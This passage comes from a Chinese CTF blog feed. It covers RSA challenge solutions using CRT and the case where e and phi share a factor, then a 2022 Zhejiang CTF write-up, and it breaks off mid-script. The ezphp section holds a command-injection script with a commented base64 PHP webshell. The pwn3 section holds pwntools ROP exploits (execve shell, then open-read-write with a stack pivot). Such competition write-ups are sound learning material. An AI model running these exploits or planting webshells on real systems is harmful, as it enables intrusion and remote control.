class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">136959726431205865477775151957746058501964084915586200859223998224419328617512480807779057493884259671732817083158742688893426777301273633213099180123980988559064240005229990903986655711210993445188959348127903344696563428112042019089659624505185444899365837872965591393711833751140798071913532034918073969303</span></span><br><span class="line">q=<span class="number">100775514992570031279080353204884456896540523509595089891057558352540088307146118253575941345444101592071454319892938692060454946607143974473707141313645549356430599711832162076318618985329980795933151213484006411944383963148067340413103907427302327136609462283013833061184517264215353793537565873817217882871</span></span><br><span class="line">e=<span class="number">618</span></span><br><span class="line">c=<span class="number">11474180598339059739824064616811901863008672847264841633401805944654527375502760803872877763162433116575938389089158136355223441822920717752520632181250987580240513955742874287005589873425759901749449152080440281411772036003528325772394140583924413056042024007990830484221229380940124523505145729796879325683192331242784866357454098755097887413530621128405967607900565276243646588213591552811550038972567938749944372033373196416854332876524071485674100971839799288548733601138685897794138343613068716766810753454049042387074495749784721897884348181557610094355833915443696680454373648737843918284068627924128987496538</span></span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line">s=gmpy2.iroot(m,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s[<span class="number">0</span>])).decode())</span><br><span class="line"><span class="comment">#flag&#123;d8600272-fa37-4f2d-92e4-2b74bf3adf71&#125;</span></span><br></pre></td></tr></table></figure><p>在这里需要使用 gmpy2 的 iroot 函数，直接进行开 6 次方的操作。</p><h4 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e1=<span class="number">14606334023791426</span></span><br><span class="line">p1=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1=<span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1=<span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line">n1=p1 * q1</span><br><span class="line">e2=<span class="number">13813369129257838</span></span><br><span class="line">p2=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2=<span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2=<span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line">n2=p2 * q2</span><br></pre></td></tr></table></figure><p>这题略微有点难，因为需要用到新的数学知识了。</p><p>首先可以看到有 $c_1,c_2$，并且两个公钥由公因数 p。我们任意使用其中一个加密体系都发现 e 与 $\phi$ 不互素，并且有公约数 14，这题就不能像之前那么故技重施了，因为 14 这个指数虽然小但是也不小，直接开是开不了的，但是我们可以转换密钥体系。</p><p>根据之前的一些理论我们可以得出以下式子</p><p>$res_1=m^{14}%n_1=c_1^{d_1}%n_1$</p><p>$res_2=m^{14}%n_2=c_2^{d_2}%n_2$</p><p>我们在其中分解 p 和 q 可以得到三个式子。</p><p>$res_1%p=m^{14}%p$</p><p>$res_1%q_1=m^{14}%q_1$</p><p>$res_2%q_2=m^{14}%q_2$</p><p>对于这三个等式，我们可以使用中国剩余定理求出满足这三个方程的数 。</p><h4 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>中国剩余定理 (Chinese Remainder Theorem, CRT) 可求解如下形式的一元线性同余方程组（其中 $n_1, n_2, \cdots, n_k$ 两两互质）：</p><p>$$<br>\begin{cases}<br>x &amp;\equiv a_1 \pmod {n_1} \<br>x &amp;\equiv a_2 \pmod {n_2} \<br>  &amp;\vdots \<br>x &amp;\equiv a_k \pmod {n_k} \<br>\end{cases}<br>$$</p><p>上面的「物不知数」问题就是一元线性同余方程组的一个实例。</p><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><ol><li>计算所有模数的积 $n$；</li><li>对于第 $i$ 个方程：<ol><li>计算 $m_i=\frac{n}{n_i}$；</li><li>计算 $m_i$ 在模 $n_i$ 意义下的 逆元  $m_i^{-1}$；</li><li>计算 $c_i=m_im_i^{-1}$（<strong>不要对 $n_i$ 取模</strong>）。</li></ol></li><li>方程组在模 $n$ 意义下的唯一解为：$x=\sum_{i=1}^k a_ic_i \pmod n$。</li></ol><h5 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h5><p>我们需要证明上面算法计算所得的 $x$ 对于任意 $i=1,2,\cdots,k$ 满足 $x\equiv a_i \pmod {n_i}$。</p><p>当 $i\neq j$ 时，有 $m_j \equiv 0 \pmod {n_i}$，故 $c_j \equiv m_j \equiv 0 \pmod {n_i}$。又有 $c_i \equiv m_i \cdot (m_i^{-1} \bmod {n_i}) \equiv 1 \pmod {n_i}$，所以我们有：</p><p>$$<br>\begin{aligned}<br>x&amp;\equiv \sum_{j=1}^k a_jc_j                      &amp;\pmod {n_i} \<br> &amp;\equiv a_ic_i                                   &amp;\pmod {n_i} \<br> &amp;\equiv a_i \cdot m_i \cdot (m^{-1}_i \bmod n_i) &amp;\pmod {n_i} \<br> &amp;\equiv a_i                                      &amp;\pmod {n_i}<br>\end{aligned}<br>$$</p><p><strong>即对于任意 $i=1,2,\cdots,k$，上面算法得到的 $x$ 总是满足 $x\equiv a_i \pmod{n_i}$，即证明了解同余方程组的算法的正确性。</strong></p><p>因为我们没有对输入的 $a_i$ 作特殊限制，所以任何一组输入 ${a_i}$ 都对应一个解 $x$。</p><p>另外，若 $x\neq y$，则总存在 $i$ 使得 $x$ 和 $y$ 在模 $n_i$ 下不同余。</p><p><strong>故系数列表 ${a_i}$ 与解 $x$ 之间是一一映射关系，方程组总是有唯一解。</strong></p><h4 id="解题脚本-4"><a href="#解题脚本-4" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">e1=<span class="number">14606334023791426</span></span><br><span class="line">p1=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1=<span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1=<span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2=<span class="number">13813369129257838</span></span><br><span class="line">p2=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2=<span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2=<span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line">n2=p2 * q2</span><br><span class="line">phi1=(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2=(p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d1=inverse(e1,phi1)</span><br><span class="line">d2=inverse(e2,phi2)</span><br><span class="line">res1=<span class="built_in">pow</span>(c1,d1,p1*q1)</span><br><span class="line">res2=<span class="built_in">pow</span>(c2,d2,p1*q2)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">res1%q1=m^14%q1</span></span><br><span class="line"><span class="string">res2%q2=m^14%q2</span></span><br><span class="line"><span class="string">res1%p=m^14%p</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a1=res1%q1</span><br><span class="line">a2=res2%q2</span><br><span class="line">a3=res1*res2%p1</span><br><span class="line">n=p1*q1*q2</span><br><span class="line">n1=n//q1</span><br><span class="line">n2=n//q2</span><br><span class="line">n3=n//p1</span><br><span class="line">m1=inverse(n1,q1)</span><br><span class="line">m2=inverse(n2,q2)</span><br><span class="line">m3=inverse(n3,p1)</span><br><span class="line">res=(n1*m1*a1+n2*m2*a2+n3*m3*a3)</span><br><span class="line">n=q1*q2</span><br><span class="line">e=<span class="number">14</span></span><br><span class="line">c=res%n</span><br><span class="line">phi=(q1-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(res,d,n)</span><br><span class="line">l=iroot(m,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(l[<span class="number">0</span>])))</span><br><span class="line"><span class="comment">#flag&#123;gcd_e&amp;φ_isn&#x27;t_1&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近驹宝给我塞了很多RSA的题，自己也做了很多，学下点 RSA 算法的精髓，写一篇总结，后续持续在这里更新。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    <category term="RSA" scheme="http://example.com/categories/ctf/crypto/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>浙江省2022省赛write up</title>
    <link href="http://example.com/2022/09/24/ZJCTF-2022/"/>
    <id>http://example.com/2022/09/24/ZJCTF-2022/</id>
    <published>2022-09-24T11:00:00.000Z</published>
    <updated>2022-09-24T13:17:46.763Z</updated>
    
    <content type="html"><![CDATA[<p>久违的题解来啦！！！</p><span id="more"></span><h1 id="沙耶之歌战队"><a href="#沙耶之歌战队" class="headerlink" title="沙耶之歌战队"></a>沙耶之歌战队</h1><ol><li>解题过程中，关键步骤不可省略，不可含糊其辞、一笔带过。</li><li>解题过程中如是自己编写的脚本，不可省略，不可截图（代码字体可以调小；而如果代码太 长，则贴关键代码函数）。 </li><li>您队伍所有解出的题目都必须书写WRITEUP，缺少一个则视该WRITEUP无效，队伍成绩将无 效。</li><li>WRITEUP如过于简略和敷衍，导致无法形成逻辑链条推断出战队对题目有分析和解决的能 力，该WRITEUP可能被视为无效，队伍成绩将无效。</li><li>提交PDF版本即可</li></ol><h2 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h2><ul><li>战队名：沙耶之歌</li><li>排名：3</li></ul><h2 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h2><p><img src="/2022/09/24/ZJCTF-2022/main.png" alt="main"></p><p>所有题目的附件<a href="ZJCTF-2022/ZJCTF2022.zip">👇</a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>sqlmap一把梭，用个space2mssqlhash tamper即可。</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><table><thead><tr><th>7.1.0</th><th><a href="php/migration71.incompatible.html#migration71.incompatible.rand_srand_aliases">内置的随机数产生算法从 libc rand 函数改成 </a><a href="http://www.math.sci.hiroshima_u.ac.jp/~m_mat/MT/emt.html">» 梅森旋转</a>伪随机数生成算法。</th></tr></thead></table><p>所以可以爆破。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(time() + 1);</span><br><span class="line"><span class="meta">$</span><span class="bash">cmd=<span class="string">&#x27;ls+-al+./&#x27;</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$cmd</span>=<span class="string">&#x27;echo%20PD9waHAKZWNobyAnbXFtJzsKQGV2YWwoJF9QT1NUWydjbWQnXSk7Cg==|base64%20-d&gt;mqm.php&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a = array(<span class="string">&quot;system&quot;</span>, <span class="variable">$cmd</span>);</span></span><br><span class="line">for ($i = 0; $i &lt;= 10000; $i++) &#123;</span><br><span class="line">    array_push($a, &quot;Ctfer&quot;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">shuffle($</span><span class="bash">a);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">n1 = array_search(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$n1</span> . <span class="string">&#x27;   &#x27;</span> . <span class="variable">$a</span>[<span class="variable">$n1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">n2 = array_search(<span class="variable">$cmd</span>, <span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$n2</span> . <span class="string">&#x27;   &#x27;</span> . <span class="variable">$a</span>[<span class="variable">$n2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line"><span class="meta">$</span><span class="bash">ch = curl_init();</span></span><br><span class="line"></span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line"><span class="meta">curl_setopt($</span><span class="bash">ch, CURLOPT_URL, <span class="string">&quot;http://1.14.97.218:21659/index.php?cmd=&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;&amp;b=&quot;</span> . <span class="variable">$n1</span> . <span class="string">&quot;&amp;c=&quot;</span> . <span class="variable">$n2</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">print_r(<span class="string">&quot;http://1.14.97.218:21659/index.php?cmd=&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;&amp;b=&quot;</span> . <span class="variable">$n1</span> . <span class="string">&quot;&amp;c=&quot;</span> . <span class="variable">$n2</span>);</span></span><br><span class="line"><span class="meta">curl_setopt($</span><span class="bash">ch, CURLOPT_HEADER, 1);</span></span><br><span class="line"><span class="meta">curl_setopt($</span><span class="bash">ch, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line">// 抓取URL并把它传递给浏览器</span><br><span class="line"><span class="meta">$</span><span class="bash">s = curl_exec(<span class="variable">$ch</span>);</span></span><br><span class="line"><span class="meta">print_r($</span><span class="bash">s);</span></span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line"><span class="meta">curl_close($</span><span class="bash">ch);</span></span><br></pre></td></tr></table></figure><p>然后burpsuite跑一下即可。</p><p>这题没权限写马，浪费了很多时间，可惜。</p><p>所以总结一下：一般情况下，非文件上传功能的目录都是不给 w 权限的，所以能执行命令就不要写🐎</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h4 id="题目分析（赛后复现的赛中分析）"><a href="#题目分析（赛后复现的赛中分析）" class="headerlink" title="题目分析（赛后复现的赛中分析）"></a>题目分析（赛后复现的赛中分析）</h4><p>静态链接的 elf，逻辑比较难以分析，不过根据题目的描述选择直接 down 下来跑一下看看。</p><p><img src="/2022/09/24/ZJCTF-2022/1.png" alt="1"></p><p>发现是一个迷宫，用 wsad 上下左右移动，结果显而易见，走到出口之后打印了我们一个 flag 字符串，其它什么都没有给，但是貌似最后还有一个输入，考虑一下栈溢出，输入大量数据来确定。</p><p>为了方便调试还是选择用脚本跑掉前面的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;sssssdddwwwdddwdww&#x27;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        p.recvline()</span><br><span class="line">    p.sendline(i)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结束之后输入大量的 a 发现 0x4017cc 的返回指令返回到 0x6171717171717171，说明我们写的 a 覆盖到了返回地址，这里我们就能劫持程序流了。</p><p><img src="/2022/09/24/ZJCTF-2022/2.png" alt="2"></p><p>反复跑脚本确定了缓冲区大小是 0x178，我们需要在 0x180 之后输入返回地址劫持。由于是静态链接，静态链接中能找到调用的 execve 函数，直接使用 gadget 调用结束。在静态链接中，想要准确的找到函数的位置基本是挺难的，但是 execve 还是比较好找的，我们直接搜 /bin/sh 字符串，然后交叉引用就能看到。</p><p><img src="/2022/09/24/ZJCTF-2022/3.png" alt="3"></p><p>就是图中 0x5cd630 函数。</p><p>然后我们补一下脚本，这里为了方便调试，我们直接把断点打在返回指令的地址。    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;sssssdddwwwdddwdww&#x27;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        p.recvline()</span><br><span class="line">    p.sendline(i)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004008f6</span></span><br><span class="line">pop_rsi=<span class="number">0x000000000040417f</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000051d4b6</span></span><br><span class="line">execve=<span class="number">0x5cd630</span> </span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(execve)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x4017cc&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>+payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>当我以为成功的时候</p><p><img src="/2022/09/24/ZJCTF-2022/4.png" alt="4"></p><p>发现 shell 并没有用，于是才发现这题开了沙箱保护，禁用了 execve 系统调用，因此我们的提权计划宣告失败。</p><p>那我们只能选择 orw 去读出 flag，但是当把所有的 gadget 找齐拼接好以后发现他溢出长度还有限制。</p><p>于是这个时候我只能选择栈迁移，不过栈迁移之前需要在一个确定可读可写的位置写上 rop 链才能达到目的。</p><p>这里还需要一个最终的 gadget：pop rdx ; pop rsi ; ret。不然发现长度还是不够，而我最终的 exp 则是刚刚好利用完所有的空间，这里还省了一个 pop rax ; ret，因为它程序运行到这里就直接 rax=0 了，所以这里可以省下 17 字节。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote()</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;sssssdddwwwdddwdww&#x27;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        p.recvline()</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        s+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> s&gt;<span class="number">5</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    p.sendline(i)</span><br><span class="line"></span><br><span class="line">pop_rax=<span class="number">0x0000000000400a4f</span></span><br><span class="line">syscall=<span class="number">0x00000000004025ab</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004008f6</span></span><br><span class="line">pop_rsi=<span class="number">0x000000000040417f</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000051d4b6</span></span><br><span class="line">pop_rbx=<span class="number">0x0000000000402498</span></span><br><span class="line">pop_dx_si=<span class="number">0x000000000051d559</span></span><br><span class="line">buf=<span class="number">0x98a000</span></span><br><span class="line">leave=<span class="number">0x00000000004017cb</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)<span class="comment">#open</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.search(<span class="string">b&#x27;flag&#x27;</span>).__next__())</span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(pop_rsi)+p64(buf)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi)+p64(buf)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line">pa=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#pa=p64(pop_rax)+p64(0)</span></span><br><span class="line">pa+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">pa+=p64(pop_dx_si)+p64(<span class="number">0x100</span>)+p64(buf+<span class="number">0x300</span>)</span><br><span class="line">pa+=p64(syscall)+p64(leave)</span><br><span class="line"><span 